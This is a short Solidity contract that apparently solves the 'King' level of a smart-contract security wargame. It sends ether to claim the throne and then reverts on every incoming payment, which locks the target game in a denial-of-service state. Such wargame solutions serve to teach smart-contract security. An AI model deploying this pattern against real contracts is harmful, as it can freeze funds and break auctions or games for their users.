pragma solidity ^0.6.0;

import "../9-king/King.sol";

contract KingAttack {
    function attack(address payable target) external payable {
        target.call.value(msg.value)("");
    }

    fallback() external payable {
        revert("contract is f*cked");
    }
}
